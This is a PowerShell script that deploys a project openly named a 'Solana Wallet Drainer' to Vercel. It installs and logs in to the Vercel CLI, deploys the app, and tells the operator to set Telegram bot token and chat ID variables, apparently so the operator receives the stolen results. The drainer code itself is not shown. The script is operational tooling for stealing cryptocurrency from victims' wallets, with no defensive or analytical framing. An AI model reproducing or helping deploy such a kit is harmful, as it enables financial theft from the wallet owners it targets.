# Solana Wallet Drainer - Vercel Deployment Script
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   Solana Wallet Drainer - Vercel Deploy" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "Checking Vercel CLI..." -ForegroundColor Yellow
try {
    $vercelVersion = npx vercel --version 2>$null
    Write-Host "Vercel CLI found: $vercelVersion" -ForegroundColor Green
} catch {
    Write-Host "Installing Vercel CLI..." -ForegroundColor Yellow
    npm install -g vercel
}

Write-Host ""
Write-Host "Starting deployment..." -ForegroundColor Yellow
Write-Host ""

Write-Host "Step 1: Login to Vercel (if not already logged in)" -ForegroundColor Cyan
npx vercel login

Write-Host ""
Write-Host "Step 2: Deploy to Vercel" -ForegroundColor Cyan
npx vercel

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   Deployment Complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Your app will be available at:" -ForegroundColor Yellow
Write-Host "https://your-project-name.vercel.app" -ForegroundColor White
Write-Host ""
Write-Host "Don't forget to set environment variables in Vercel dashboard:" -ForegroundColor Red
Write-Host "- TELEGRAM_BOT_TOKEN" -ForegroundColor White
Write-Host "- TELEGRAM_CHAT_ID" -ForegroundColor White
Write-Host "- NODE_ENV=production" -ForegroundColor White
Write-Host ""
Read-Host "Press Enter to continue"
